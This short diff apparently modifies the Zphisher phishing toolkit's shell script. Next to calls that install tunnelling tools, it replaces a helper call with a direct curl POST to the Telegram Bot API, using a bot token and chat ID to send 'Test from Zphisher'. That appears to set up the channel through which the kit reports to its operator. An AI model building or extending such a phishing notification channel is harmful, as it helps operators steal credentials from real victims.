@@ -925,6 +925,6 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-# تجربة البوت
-send_telegram "System" "Started" "127.0.0.1"
+# اختبار مباشر للدالة
+curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="Test from Zphisher" -d parse_mode="Markdown" > /dev/null
 main_menu
